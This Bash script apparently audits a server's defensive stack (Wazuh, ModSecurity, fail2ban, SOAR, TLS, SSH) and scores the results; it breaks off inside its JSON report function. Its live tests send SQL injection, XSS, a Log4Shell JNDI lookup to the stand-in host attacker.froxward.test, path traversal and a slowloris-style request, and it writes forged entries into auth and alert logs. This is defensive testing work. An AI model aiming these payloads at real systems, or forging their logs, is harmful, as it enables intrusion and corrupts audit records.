#!/usr/bin/env bash
# =============================================================================
#  FROXWARD SECURITY AUDIT — checksec.sh
#  Active security checks — detects, scores, and TRIGGERS live tests
#  Scores every component 0-100, gives final grade A/B/C/D/F
# =============================================================================
set -uo pipefail

# ─── COLORS ───────────────────────────────────────────────────────────────────
R='\033[0;31m'; Y='\033[1;33m'; G='\033[0;32m'
C='\033[0;36m'; B='\033[1m'; DIM='\033[2m'; N='\033[0m'

# ─── CONFIG ───────────────────────────────────────────────────────────────────
TARGET="${TARGET:-http://localhost}"
APP_PORT="${APP_PORT:-80}"
REPORT_FILE="/tmp/froxward_checksec_$(date +%Y%m%d_%H%M%S).txt"
MODSEC_AUDIT_LOG="/var/log/modsec_audit.log"
WAZUH_ALERTS_LOG="/var/ossec/logs/alerts/alerts.json"
SOAR_LOG="/var/log/froxward_soar.log"

# ─── SCORING ENGINE ───────────────────────────────────────────────────────────
declare -A SCORES
declare -A MAX_SCORES

score() {
    local category="$1" points="$2" max="$3" label="$4"
    SCORES["$category"]=$(( ${SCORES["$category"]:-0} + points ))
    MAX_SCORES["$category"]=$(( ${MAX_SCORES["$category"]:-0} + max ))
}

# ─── DISPLAY HELPERS ──────────────────────────────────────────────────────────
PASS=0; FAIL=0; WARN=0
section()  { echo -e "\n${C}${B}[ $* ]${N}"; echo "[ $* ]" >> "$REPORT_FILE"; }
ok()       { echo -e "  ${G}✔${N}  $*"; echo "  OK   $*" >> "$REPORT_FILE"; ((PASS++)); }
fail()     { echo -e "  ${R}✗${N}  $*"; echo "  FAIL $*" >> "$REPORT_FILE"; ((FAIL++)); }
warn_msg() { echo -e "  ${Y}!${N}  $*"; echo "  WARN $*" >> "$REPORT_FILE"; ((WARN++)); }
info()     { echo -e "  ${DIM}→${N}  $*"; echo "  INFO $*" >> "$REPORT_FILE"; }
active()   { echo -e "  ${C}⚡${N}  ${B}[LIVE TEST]${N} $*"; echo "  TEST $*" >> "$REPORT_FILE"; }

require_root() { [[ $EUID -eq 0 ]] || { echo -e "${R}Run as root.${N}"; exit 1; }; }

detect_env() {
    section "Environment Detection"
    WEB_SERVER="none"
    FIREWALL="iptables"

    command -v nginx   &>/dev/null && WEB_SERVER="nginx"
    command -v apache2 &>/dev/null && WEB_SERVER="apache"
    command -v httpd   &>/dev/null && WEB_SERVER="apache"
    command -v nft     &>/dev/null && nft list tables &>/dev/null 2>&1 && FIREWALL="nftables"

    # Автодетект порта если не задан через env
    if [[ "$TARGET" == "http://localhost" ]]; then
        SKIP_PORTS="22 25 53 111 443 1514 1515 3306 5432 6379 27017 55000"
        LISTENING=()
        while IFS= read -r port; do
            skip=0
            for sp in $SKIP_PORTS; do [[ "$port" == "$sp" ]] && skip=1 && break; done
            [[ $skip -eq 0 ]] && LISTENING+=("$port")
        done < <(ss -tlnp 2>/dev/null | grep -oP '(?<=\*:|0\.0\.0\.0:|:::)\d+' | sort -un)

        if [[ ${#LISTENING[@]} -eq 1 ]]; then
            TARGET="http://localhost:${LISTENING[0]}"
            APP_PORT="${LISTENING[0]}"
            info "Автодетект порта: ${LISTENING[0]}"
        elif [[ ${#LISTENING[@]} -gt 1 ]]; then
            echo -e "${Y}Найдено несколько портов: ${LISTENING[*]}${N}"
            for i in "${!LISTENING[@]}"; do
                echo -e "  ${B}$((i+1))${N}) ${LISTENING[$i]}"
            done
            read -rp "$(echo -e "${C}Выбери порт для аудита [1-${#LISTENING[@]}]: ${N}")" choice
            if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#LISTENING[@]} )); then
                APP_PORT="${LISTENING[$((choice-1))]}"
                TARGET="http://localhost:${APP_PORT}"
            fi
        fi
    fi

    info "Web server : $WEB_SERVER"
    info "Firewall   : $FIREWALL"
    info "Target URL : $TARGET"

    if [[ -f /etc/os-release ]]; then
        # shellcheck disable=SC1091
        source /etc/os-release
        info "OS         : ${PRETTY_NAME:-unknown}"
    fi
}

# =============================================================================
#  1. WAZUH
# =============================================================================
check_wazuh() {
    section "Wazuh SIEM"

    # Service running
    if systemctl is-active --quiet wazuh-manager 2>/dev/null; then
        ok "wazuh-manager is running"
        score "wazuh" 20 20 "service"
    else
        fail "wazuh-manager is NOT running"
        score "wazuh" 0 20 "service"
    fi

    # Custom rules deployed
    RULE_COUNT=$(find /var/ossec/etc/rules/ -maxdepth 1 -name '*.xml' 2>/dev/null | wc -l)
    if (( RULE_COUNT > 0 )); then
        ok "Custom rules loaded: $RULE_COUNT files"
        score "wazuh" 15 15 "rules"
    else
        fail "No custom rules found in /var/ossec/etc/rules/"
        score "wazuh" 0 15 "rules"
    fi

    # Alerts JSON output enabled
    if [[ -f "$WAZUH_ALERTS_LOG" ]]; then
        RECENT_ALERTS=$(tail -n 100 "$WAZUH_ALERTS_LOG" 2>/dev/null | grep -c '"level"' || true)
        ok "Alerts JSON present ($RECENT_ALERTS recent entries)"
        score "wazuh" 10 10 "alerts_json"
    else
        fail "Alerts JSON not found: $WAZUH_ALERTS_LOG"
        score "wazuh" 0 10 "alerts_json"
    fi

    # Active response configured
    if grep -q "firewall-drop\|host-deny" /var/ossec/etc/ossec.conf 2>/dev/null; then
        ok "Active response configured"
        score "wazuh" 15 15 "active_response"
    else
        fail "Active response NOT configured"
        score "wazuh" 0 15 "active_response"
    fi

    # Log monitors configured
    MONITOR_COUNT=$(grep -c "<localfile>" /var/ossec/etc/ossec.conf 2>/dev/null || true)
    if (( MONITOR_COUNT >= 3 )); then
        ok "Log monitors configured: $MONITOR_COUNT sources"
        score "wazuh" 10 10 "monitors"
    else
        warn_msg "Few log monitors ($MONITOR_COUNT). Expected >= 3"
        score "wazuh" 5 10 "monitors"
    fi

    # ── LIVE TEST: trigger a wazuh alert ─────────────────────────────────────
    active "Triggering test alert via failed auth attempt..."
    BEFORE=$(wc -l < "$WAZUH_ALERTS_LOG" 2>/dev/null || echo 0)
    # Trigger sshd failure (safe — wrong key, not brute force)
    ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=2 \
        -p 22 fakeuserfroxward@127.0.0.1 2>/dev/null || true
    sleep 3
    AFTER=$(wc -l < "$WAZUH_ALERTS_LOG" 2>/dev/null || echo 0)
    if (( AFTER > BEFORE )); then
        ok "Wazuh detected test event (log grew by $((AFTER - BEFORE)) lines)"
        score "wazuh" 30 30 "live_detection"
    else
        fail "Wazuh did NOT generate new alerts after test event"
        score "wazuh" 0 30 "live_detection"
    fi
}

# =============================================================================
#  2. MODSECURITY + OWASP CRS
# =============================================================================
check_modsecurity() {
    section "ModSecurity + OWASP CRS"

    # Config exists
    if [[ -f /etc/modsecurity/modsecurity.conf ]]; then
        ok "modsecurity.conf present"
        score "modsec" 10 10 "config"
    else
        fail "modsecurity.conf NOT found"
        score "modsec" 0 10 "config"
    fi

    # Engine ON
    if grep -q "SecRuleEngine On" /etc/modsecurity/modsecurity.conf 2>/dev/null; then
        ok "SecRuleEngine: On"
        score "modsec" 10 10 "engine"
    else
        fail "SecRuleEngine is NOT On"
        score "modsec" 0 10 "engine"
    fi

    # Paranoia level
    PL=$(grep -oP 'tx\.paranoia_level=\K\d+' /etc/modsecurity/modsecurity.conf 2>/dev/null | head -1)
    if [[ -n "$PL" ]]; then
        if (( PL >= 2 )); then
            ok "Paranoia Level: $PL (high coverage)"
            score "modsec" 10 10 "paranoia"
        else
            warn_msg "Paranoia Level: $PL (low — recommend >= 2)"
            score "modsec" 5 10 "paranoia"
        fi
    else
        warn_msg "Paranoia Level not set"
        score "modsec" 0 10 "paranoia"
    fi

    # CRS rules count
    CRS_COUNT=$(find /etc/modsecurity/crs/rules/ -maxdepth 1 -name '*.conf' 2>/dev/null | wc -l)
    if (( CRS_COUNT > 10 )); then
        ok "OWASP CRS rules: $CRS_COUNT files"
        score "modsec" 10 10 "crs"
    else
        fail "CRS rules missing or incomplete ($CRS_COUNT files)"
        score "modsec" 0 10 "crs"
    fi

    # Audit log
    if [[ -f "$MODSEC_AUDIT_LOG" ]]; then
        ok "Audit log present: $MODSEC_AUDIT_LOG"
        score "modsec" 5 5 "audit_log"
    else
        warn_msg "Audit log not found yet (created on first trigger)"
        score "modsec" 3 5 "audit_log"
    fi

    # ── LIVE TESTS ────────────────────────────────────────────────────────────
    _test_modsec_sqli
    _test_modsec_xss
    _test_modsec_scanner_ua
    _test_modsec_log4shell
    _test_modsec_path_traversal
}

_modsec_live_test() {
    local url="$1" ua="${2:-Mozilla/5.0}"
    local http_code
    http_code=$(curl -sk -o /dev/null -w "%{http_code}" \
        -A "$ua" "$url" --max-time 5 2>/dev/null || echo "000")
    echo "$http_code"
}

_test_modsec_sqli() {
    active "SQLi test: GET /?id=1' OR '1'='1"
    CODE=$(_modsec_live_test "${TARGET}/?id=1%27+OR+%271%27%3D%271")
    if [[ "$CODE" == "403" || "$CODE" == "406" || "$CODE" == "400" ]]; then
        ok "SQLi blocked (HTTP $CODE)"
        score "modsec" 15 15 "sqli"
    else
        fail "SQLi NOT blocked (HTTP $CODE) — ModSecurity may not be active"
        score "modsec" 0 15 "sqli"
    fi
}

_test_modsec_xss() {
    active "XSS test: GET /?q=<script>alert(1)</script>"
    CODE=$(_modsec_live_test "${TARGET}/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E")
    if [[ "$CODE" == "403" || "$CODE" == "406" || "$CODE" == "400" ]]; then
        ok "XSS blocked (HTTP $CODE)"
        score "modsec" 10 10 "xss"
    else
        fail "XSS NOT blocked (HTTP $CODE)"
        score "modsec" 0 10 "xss"
    fi
}

_test_modsec_scanner_ua() {
    active "Scanner UA test: User-Agent: sqlmap"
    CODE=$(_modsec_live_test "$TARGET" "sqlmap/1.0")
    if [[ "$CODE" == "403" || "$CODE" == "444" || "$CODE" == "400" ]]; then
        ok "Scanner UA blocked (HTTP $CODE)"
        score "modsec" 10 10 "scanner_ua"
    else
        fail "Scanner UA NOT blocked (HTTP $CODE)"
        score "modsec" 0 10 "scanner_ua"
    fi
}

_test_modsec_log4shell() {
    active "Log4Shell test: \${jndi:ldap://attacker.com/exploit}"
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H 'X-Api-Version: ${jndi:ldap://attacker.froxward.test/a}' \
        "$TARGET" --max-time 5 2>/dev/null || echo "000")
    if [[ "$CODE" == "403" || "$CODE" == "400" ]]; then
        ok "Log4Shell blocked (HTTP $CODE)"
        score "modsec" 10 10 "log4shell"
    else
        fail "Log4Shell NOT blocked (HTTP $CODE)"
        score "modsec" 0 10 "log4shell"
    fi
}

_test_modsec_path_traversal() {
    active "Path traversal test: GET /../../etc/passwd"
    CODE=$(_modsec_live_test "${TARGET}/../../etc/passwd")
    if [[ "$CODE" == "403" || "$CODE" == "400" ]]; then
        ok "Path traversal blocked by WAF (HTTP $CODE)"
        score "modsec" 10 10 "path_traversal"
    elif [[ "$CODE" == "404" ]]; then
        warn_msg "Path traversal returned 404 (may be web server, not WAF)"
        score "modsec" 5 10 "path_traversal"
    else
        fail "Path traversal NOT blocked (HTTP $CODE)"
        score "modsec" 0 10 "path_traversal"
    fi
}

# =============================================================================
#  3. DDOS PROTECTION
# =============================================================================
check_ddos() {
    section "DDoS Protection"

    # Sysctl checks
    _sysctl_check() {
        local key="$1" expected="$2" label="$3" pts="$4"
        local val
        val=$(sysctl -n "$key" 2>/dev/null || echo "0")
        if [[ "$val" == "$expected" ]]; then
            ok "sysctl $label = $val"
            score "ddos" "$pts" "$pts" "$key"
        else
            fail "sysctl $label = $val (expected $expected)"
            score "ddos" 0 "$pts" "$key"
        fi
    }

    _sysctl_check "net.ipv4.tcp_syncookies"                "1"  "tcp_syncookies"    5
    _sysctl_check "net.ipv4.icmp_echo_ignore_broadcasts"   "1"  "icmp_no_broadcast" 5
    _sysctl_check "net.ipv4.conf.all.rp_filter"            "1"  "rp_filter"         5
    _sysctl_check "net.ipv4.conf.all.accept_source_route"  "0"  "no_source_route"   5
    _sysctl_check "net.ipv4.conf.all.accept_redirects"     "0"  "no_redirects"      5
    _sysctl_check "net.ipv4.conf.all.send_redirects"       "0"  "no_send_redirects" 5

    # Firewall rules exist
    if [[ "$FIREWALL" == "nftables" ]]; then
        if nft list table inet froxward &>/dev/null 2>&1; then
            ok "nftables froxward table active"
            score "ddos" 20 20 "fw_rules"
            BANNED_SET=$(nft list set inet froxward banned_ips 2>/dev/null | grep -c "elements" || echo 0)
            info "Banned IPs in set: $BANNED_SET"
        else
            fail "nftables froxward table NOT found"
            score "ddos" 0 20 "fw_rules"
        fi
    else
        RULE_COUNT=$(iptables -L INPUT 2>/dev/null | wc -l)
        if (( RULE_COUNT > 5 )); then
            ok "iptables INPUT chain has $RULE_COUNT rules"
            score "ddos" 20 20 "fw_rules"
        else
            fail "iptables INPUT chain looks empty ($RULE_COUNT rules)"
            score "ddos" 0 20 "fw_rules"
        fi
        # FROXWARD_BANNED chain
        if iptables -L FROXWARD_BANNED &>/dev/null 2>&1; then
            ok "FROXWARD_BANNED chain exists (SOAR target)"
            score "ddos" 5 5 "soar_chain"
        else
            warn_msg "FROXWARD_BANNED chain missing"
            score "ddos" 0 5 "soar_chain"
        fi
    fi

    # ── LIVE TEST: Rate limit ─────────────────────────────────────────────────
    active "Rate limit test: 60 rapid requests to $TARGET"
    BLOCKED=0
    for i in $(seq 1 60); do
        CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
            "$TARGET" --max-time 2 2>/dev/null || echo "000")
        [[ "$CODE" == "429" || "$CODE" == "503" || "$CODE" == "444" ]] && ((BLOCKED++))
    done

    if (( BLOCKED >= 10 )); then
        ok "Rate limiting active — $BLOCKED/60 requests throttled"
        score "ddos" 20 20 "rate_limit_live"
    elif (( BLOCKED >= 1 )); then
        warn_msg "Rate limiting partial — only $BLOCKED/60 requests throttled"
        score "ddos" 10 20 "rate_limit_live"
    else
        fail "Rate limiting NOT triggered (0/60 requests blocked)"
        score "ddos" 0 20 "rate_limit_live"
    fi

    # ── LIVE TEST: Slowloris simulation ──────────────────────────────────────
    active "Slowloris simulation: incomplete HTTP request timeout test"
    RESPONSE=$(timeout 15 bash -c "
        exec 3<>/dev/tcp/127.0.0.1/$APP_PORT
        printf 'GET / HTTP/1.1\r\nHost: localhost\r\n' >&3
        sleep 12
        cat <&3
        exec 3>&-
    " 2>/dev/null || echo "timeout")
    if [[ "$RESPONSE" == "timeout" || -z "$RESPONSE" ]]; then
        ok "Slowloris mitigated (connection timed out / rejected)"
        score "ddos" 10 10 "slowloris"
    else
        warn_msg "Slowloris: server accepted incomplete request"
        score "ddos" 0 10 "slowloris"
    fi
}

# =============================================================================
#  4. SOAR DAEMON
# =============================================================================
check_soar() {
    section "SOAR Automated Response"

    if systemctl is-active --quiet froxward-soar 2>/dev/null; then
        ok "SOAR daemon running"
        score "soar" 30 30 "daemon"
    else
        fail "SOAR daemon NOT running"
        score "soar" 0 30 "daemon"
    fi

    if [[ -f "$SOAR_LOG" ]]; then
        SOAR_ENTRIES=$(wc -l < "$SOAR_LOG")
        RECENT_BANS=$(grep -c "^.*BAN " "$SOAR_LOG" 2>/dev/null || true)
        ok "SOAR log present ($SOAR_ENTRIES entries, $RECENT_BANS bans recorded)"
        score "soar" 20 20 "log"
    else
        warn_msg "SOAR log not found (daemon may not have triggered yet)"
        score "soar" 10 20 "log"
    fi

    # ── LIVE TEST: inject fake critical alert, check SOAR bans it ────────────
    active "SOAR live test: injecting fake level-13 alert..."

    FAKE_IP="192.168.254.253"
    FAKE_ALERT="{\"id\":\"froxward_test_$(date +%s)\",\"rule\":{\"id\":\"99999\",\"level\":13,\"description\":\"Froxward checksec test alert\"},\"data\":{\"srcip\":\"$FAKE_IP\"},\"agent\":{\"ip\":\"$FAKE_IP\"}}"

    # Append to alerts JSON
    echo "$FAKE_ALERT" >> "$WAZUH_ALERTS_LOG" 2>/dev/null || {
        warn_msg "Cannot write to $WAZUH_ALERTS_LOG — skipping SOAR live test"
        score "soar" 0 50 "live_response"
        return
    }

    sleep 4  # Give SOAR time to process

    # Check if IP was banned
    BANNED=0
    if [[ "$FIREWALL" == "nftables" ]]; then
        nft list set inet froxward banned_ips 2>/dev/null | grep -q "$FAKE_IP" && BANNED=1
    else
        iptables -L FROXWARD_BANNED 2>/dev/null | grep -q "$FAKE_IP" && BANNED=1
    fi
    grep -q "$FAKE_IP" /tmp/froxward_banned.db 2>/dev/null && BANNED=1

    if (( BANNED )); then
        ok "SOAR auto-banned fake attacker $FAKE_IP within 4s"
        score "soar" 50 50 "live_response"
    else
        fail "SOAR did NOT ban $FAKE_IP after critical alert injection"
        score "soar" 0 50 "live_response"
    fi

    # Cleanup fake IP
    if [[ "$FIREWALL" == "nftables" ]]; then
        nft delete element inet froxward banned_ips "{ $FAKE_IP }" 2>/dev/null || true
    else
        iptables -D FROXWARD_BANNED -s "$FAKE_IP" -j DROP 2>/dev/null || true
    fi
    sed -i "/$FAKE_IP/d" /tmp/froxward_banned.db 2>/dev/null || true
}

# =============================================================================
#  5. FAIL2BAN
# =============================================================================
check_fail2ban() {
    section "Fail2ban"

    if systemctl is-active --quiet fail2ban 2>/dev/null; then
        ok "fail2ban running"
        score "fail2ban" 20 20 "service"
    else
        fail "fail2ban NOT running"
        score "fail2ban" 0 20 "service"
    fi

    ACTIVE_JAILS=$(fail2ban-client status 2>/dev/null | grep "Jail list" | \
        grep -oP '(?<=:\s).*' | tr ',' '\n' | grep -c '\S' || true)
    if (( ACTIVE_JAILS >= 3 )); then
        ok "Active jails: $ACTIVE_JAILS"
        score "fail2ban" 20 20 "jails"
    elif (( ACTIVE_JAILS >= 1 )); then
        warn_msg "Only $ACTIVE_JAILS jail(s) active (expected >= 3)"
        score "fail2ban" 10 20 "jails"
    else
        fail "No active jails"
        score "fail2ban" 0 20 "jails"
    fi

    # ── LIVE TEST: trigger SSH jail ───────────────────────────────────────────
    active "Fail2ban SSH jail test: 5 rapid fake auth failures..."
    TEST_IP="192.0.2.99"  # TEST-NET, won't route anywhere

    for i in $(seq 1 5); do
        echo "$(date '+%b %d %H:%M:%S') testhost sshd[9999]: Failed password for invalid user froxtest from $TEST_IP port $((30000+i)) ssh2" \
            >> /var/log/auth.log 2>/dev/null || true
    done

    sleep 3
    BANNED_STATUS=$(fail2ban-client status sshd 2>/dev/null | grep "Banned IP" || echo "")
    if echo "$BANNED_STATUS" | grep -q "$TEST_IP"; then
        ok "Fail2ban SSH jail triggered on test IP $TEST_IP"
        score "fail2ban" 60 60 "live_jail"
        fail2ban-client set sshd unbanip "$TEST_IP" 2>/dev/null || true
    else
        warn_msg "Fail2ban SSH jail did not trigger on injected log entries"
        score "fail2ban" 0 60 "live_jail"
    fi
}

# =============================================================================
#  6. HTTP SECURITY HEADERS
# =============================================================================
check_headers() {
    section "HTTP Security Headers"

    HEADERS=$(curl -sk -I "$TARGET" --max-time 5 2>/dev/null || echo "")

    _hdr_check() {
        local hdr="$1" pts="$2"
        if echo "$HEADERS" | grep -qi "^$hdr:"; then
            ok "Header present: $hdr"
            score "headers" "$pts" "$pts" "$hdr"
        else
            fail "Header MISSING: $hdr"
            score "headers" 0 "$pts" "$hdr"
        fi
    }

    _hdr_check "x-frame-options"         10
    _hdr_check "x-content-type-options"  10
    _hdr_check "x-xss-protection"        10
    _hdr_check "referrer-policy"         10
    _hdr_check "content-security-policy" 20
    _hdr_check "permissions-policy"      10
    _hdr_check "strict-transport-security" 15

    # Server header should NOT expose version
    if echo "$HEADERS" | grep -qi "^server: nginx$\|^server: apache$\|^server:$"; then
        ok "Server header: version hidden"
        score "headers" 15 15 "server_leak"
    elif ! echo "$HEADERS" | grep -qi "^server:"; then
        ok "Server header: absent (best)"
        score "headers" 15 15 "server_leak"
    else
        SERVER_VAL=$(echo "$HEADERS" | grep -i "^server:" | head -1)
        warn_msg "Server header exposes info: $SERVER_VAL"
        score "headers" 0 15 "server_leak"
    fi
}

# =============================================================================
#  7. SSH HARDENING
# =============================================================================
check_ssh() {
    section "SSH Hardening"
    SSHD="/etc/ssh/sshd_config"
    [[ ! -f "$SSHD" ]] && { warn_msg "sshd_config not found"; return; }

    _ssh_check() {
        local key="$1" expected="$2" pts="$3"
        local val
        val=$(grep -iP "^\s*${key}\s" "$SSHD" 2>/dev/null | awk '{print $2}' | head -1)
        if [[ "${val,,}" == "${expected,,}" ]]; then
            ok "SSH $key = $val"
            score "ssh" "$pts" "$pts" "$key"
        else
            fail "SSH $key = '${val:-not set}' (expected $expected)"
            score "ssh" 0 "$pts" "$key"
        fi
    }

    _ssh_check "PermitRootLogin"      "no"   20
    _ssh_check "MaxAuthTries"         "3"    15
    _ssh_check "X11Forwarding"        "no"   10
    _ssh_check "AllowAgentForwarding" "no"   10
    _ssh_check "AllowTcpForwarding"   "no"   10
    _ssh_check "LoginGraceTime"       "30"   10
    _ssh_check "ClientAliveInterval"  "300"  10
    _ssh_check "MaxSessions"          "3"    15
}

# =============================================================================
#  8. PORT & ATTACK SURFACE SCAN
# =============================================================================
check_open_ports() {
    section "Open Ports & Attack Surface"
    active "Self port scan (common ports)..."

    DANGEROUS_PORTS=(21 23 25 53 137 138 139 445 1433 1521 3306 3389 5432 5900 6379 27017)
    UNEXPECTED_OPEN=()

    for port in "${DANGEROUS_PORTS[@]}"; do
        if timeout 1 bash -c "echo >/dev/tcp/127.0.0.1/$port" 2>/dev/null; then
            UNEXPECTED_OPEN+=("$port")
        fi
    done

    if (( ${#UNEXPECTED_OPEN[@]} == 0 )); then
        ok "No dangerous ports exposed (checked: ${#DANGEROUS_PORTS[@]} ports)"
        score "ports" 100 100 "port_scan"
    else
        fail "Dangerous ports OPEN: ${UNEXPECTED_OPEN[*]}"
        DEDUCTION=$(( 10 * ${#UNEXPECTED_OPEN[@]} ))
        score "ports" $(( 100 - DEDUCTION < 0 ? 0 : 100 - DEDUCTION )) 100 "port_scan"
    fi

    # Wazuh API port exposed to internet?
    WAZUH_API_LISTEN=$(ss -tlnp 2>/dev/null | grep ":55000 " || true)
    if [[ -n "$WAZUH_API_LISTEN" ]] && ! echo "$WAZUH_API_LISTEN" | grep -q "127.0.0.1"; then
        warn_msg "Wazuh API port 55000 may be exposed externally"
    else
        ok "Wazuh API port 55000 not exposed externally (or not listening)"
    fi
}

# =============================================================================
#  9. TLS/SSL
# =============================================================================
check_tls() {
    section "TLS/SSL Configuration"

    if ! timeout 3 bash -c "echo >/dev/tcp/127.0.0.1/443" 2>/dev/null; then
        warn_msg "Port 443 not open — TLS checks skipped"
        score "tls" 0 100 "tls_available"
        return
    fi

    score "tls" 20 100 "tls_available"
    ok "HTTPS port 443 is open"

    # Check cipher suites via openssl
    if command -v openssl &>/dev/null; then
        # SSLv3 should be disabled
        if ! timeout 3 openssl s_client -ssl3 -connect 127.0.0.1:443 &>/dev/null 2>&1; then
            ok "SSLv3 disabled"
            score "tls" 20 20 "sslv3"
        else
            fail "SSLv3 ENABLED — critical vulnerability"
            score "tls" 0 20 "sslv3"
        fi

        # TLSv1.0 should be disabled
        if ! timeout 3 openssl s_client -tls1 -connect 127.0.0.1:443 &>/dev/null 2>&1; then
            ok "TLSv1.0 disabled"
            score "tls" 20 20 "tls10"
        else
            warn_msg "TLSv1.0 enabled (recommend disabling)"
            score "tls" 5 20 "tls10"
        fi

        # TLSv1.2 should work
        if timeout 3 openssl s_client -tls1_2 -connect 127.0.0.1:443 &>/dev/null 2>&1; then
            ok "TLSv1.2 supported"
            score "tls" 20 20 "tls12"
        else
            warn_msg "TLSv1.2 not supported"
            score "tls" 0 20 "tls12"
        fi

        # TLSv1.3 preferred
        if timeout 3 openssl s_client -tls1_3 -connect 127.0.0.1:443 &>/dev/null 2>&1; then
            ok "TLSv1.3 supported"
            score "tls" 20 20 "tls13"
        else
            warn_msg "TLSv1.3 not supported"
            score "tls" 0 20 "tls13"
        fi
    else
        warn_msg "openssl not available for cipher testing"
    fi
}

# =============================================================================
#  10. OS HARDENING CHECKS
# =============================================================================
check_os_hardening() {
    section "OS Hardening"

    # ASLR
    ASLR=$(cat /proc/sys/kernel/randomize_va_space 2>/dev/null || echo 0)
    if [[ "$ASLR" == "2" ]]; then
        ok "ASLR enabled (level 2)"
        score "os" 15 15 "aslr"
    else
        fail "ASLR not fully enabled (value: $ASLR, expected 2)"
        score "os" 0 15 "aslr"
    fi

    # dmesg restriction
    DMESG=$(cat /proc/sys/kernel/dmesg_restrict 2>/dev/null || echo 0)
    if [[ "$DMESG" == "1" ]]; then
        ok "dmesg restricted to root"
        score "os" 10 10 "dmesg"
    else
        warn_msg "dmesg not restricted (kernel.dmesg_restrict=0)"
        score "os" 0 10 "dmesg"
    fi

    # core dumps disabled
    CORE=$(ulimit -c 2>/dev/null || echo unlimited)
    if [[ "$CORE" == "0" ]]; then
        ok "Core dumps disabled"
        score "os" 10 10 "core_dumps"
    else
        warn_msg "Core dumps enabled (may leak memory)"
        score "os" 0 10 "core_dumps"
    fi

    # No world-writable files in /etc
    WW_COUNT=$(find /etc -maxdepth 2 -perm -o+w -type f 2>/dev/null | wc -l)
    if (( WW_COUNT == 0 )); then
        ok "No world-writable files in /etc"
        score "os" 15 15 "world_writable"
    else
        fail "World-writable files in /etc: $WW_COUNT files"
        score "os" 0 15 "world_writable"
    fi

    # SUID unusual binaries
    SUID_COUNT=$(find / -xdev -perm -4000 -type f 2>/dev/null \
        | grep -Ev "^(/bin|/usr/bin|/usr/sbin|/sbin)/" | wc -l)
    if (( SUID_COUNT == 0 )); then
        ok "No unusual SUID binaries outside standard paths"
        score "os" 15 15 "suid"
    else
        warn_msg "Unusual SUID binaries: $SUID_COUNT found"
        score "os" 0 15 "suid"
    fi

    # Empty password accounts
    EMPTY_PW=$(awk -F: '($2 == "" ) {print $1}' /etc/shadow 2>/dev/null | wc -l)
    if (( EMPTY_PW == 0 )); then
        ok "No empty-password accounts"
        score "os" 20 20 "empty_passwords"
    else
        fail "Accounts with empty passwords: $EMPTY_PW"
        score "os" 0 20 "empty_passwords"
    fi

    # Root-only crontab
    CRON_ISSUES=$(find /etc/cron* -maxdepth 0 ! -user root 2>/dev/null | wc -l)
    if (( CRON_ISSUES == 0 )); then
        ok "Cron directories owned by root"
        score "os" 15 15 "cron"
    else
        warn_msg "Non-root owned cron entries: $CRON_ISSUES"
        score "os" 5 15 "cron"
    fi
}

# =============================================================================
#  FINAL SCORE + GRADE
# =============================================================================
print_score() {
    echo ""
    echo -e "${C}${B}════════════════════════════════════════${N}"
    echo -e "${C}${B}         SECURITY AUDIT RESULTS         ${N}"
    echo -e "${C}${B}════════════════════════════════════════${N}"
    echo "" | tee -a "$REPORT_FILE"

    local grand_total=0
    local grand_max=0

    declare -A CAT_LABELS=(
        [wazuh]="Wazuh SIEM"
        [modsec]="ModSecurity + CRS"
        [ddos]="DDoS Protection"
        [soar]="SOAR Response"
        [fail2ban]="Fail2ban"
        [headers]="HTTP Headers"
        [ssh]="SSH Hardening"
        [ports]="Port Security"
        [tls]="TLS/SSL"
        [os]="OS Hardening"
    )

    for cat in wazuh modsec ddos soar fail2ban headers ssh ports tls os; do
        local pts=${SCORES[$cat]:-0}
        local max=${MAX_SCORES[$cat]:-0}
        [[ $max -eq 0 ]] && continue

        local pct=$(( pts * 100 / max ))
        local label="${CAT_LABELS[$cat]:-$cat}"

        # Color by score
        local color="$R"
        (( pct >= 80 )) && color="$G"
        (( pct >= 50 && pct < 80 )) && color="$Y"

        # Progress bar
        local bar_len=20
        local filled=$(( pct * bar_len / 100 ))
        local bar=""
        for ((i=0; i<filled; i++)); do bar+="█"; done
        for ((i=filled; i<bar_len; i++)); do bar+="░"; done

        printf "  %-22s ${color}%3d%%${N} [%s] %d/%d\n" \
            "$label" "$pct" "$bar" "$pts" "$max"
        echo "  $label: $pct% ($pts/$max)" >> "$REPORT_FILE"

        grand_total=$(( grand_total + pts ))
        grand_max=$(( grand_max + max ))
    done

    local grand_pct=$(( grand_total * 100 / grand_max ))

    # Grade
    local grade color
    if   (( grand_pct >= 90 )); then grade="A+"; color="$G"
    elif (( grand_pct >= 80 )); then grade="A";  color="$G"
    elif (( grand_pct >= 70 )); then grade="B";  color="$Y"
    elif (( grand_pct >= 60 )); then grade="C";  color="$Y"
    elif (( grand_pct >= 50 )); then grade="D";  color="$R"
    else                               grade="F";  color="$R"
    fi

    echo ""
    echo -e "${C}${B}════════════════════════════════════════${N}"
    echo -e "  Total: ${grand_total}/${grand_max} points"
    echo -e "  Score: ${color}${B}${grand_pct}%${N}"
    echo -e "  Grade: ${color}${B}${grade}${N}"
    echo -e "  Checks: ${G}$PASS passed${N} / ${R}$FAIL failed${N} / ${Y}$WARN warnings${N}"
    echo -e "${C}${B}════════════════════════════════════════${N}"
    echo ""
    echo -e "  Report saved: ${DIM}$REPORT_FILE${N}"
    echo ""

    echo "" >> "$REPORT_FILE"
    echo "Total: $grand_total/$grand_max ($grand_pct%) — Grade: $grade" >> "$REPORT_FILE"
    echo "Checks: $PASS passed / $FAIL failed / $WARN warnings" >> "$REPORT_FILE"
    echo "Report generated: $(date)" >> "$REPORT_FILE"
}

# =============================================================================
#  JSON REPORT
# =============================================================================
print_json_report() {
    local grand_total=0 grand_max=0
    echo "{"
    echo '  "timestamp": "'"$(date -Iseconds)"'",'
    echo '  "categories": {'

    local first=1
    for cat in wazuh modsec ddos soar fail2ban headers ssh ports tls os; do
        local pts=${SCORES[$cat]:-0}
        local max=${MAX_SCORES[$cat]:-0}
        [[ $max -eq 0 ]] && continue
        local pct=$(( pts * 100 / max ))
        grand_total=$(( grand_total + pts ))
        grand_max=$(( grand_max + max ))

        (( first )) || echo ","
        first=0
        printf '    "%s": {"score": %d, "max": %d, "percent": %d}' \
            "$cat" "$pts" "$max" "$pct"
    done

    local grand_pct=$(( grand_total * 100 / grand_max ))
    local grade
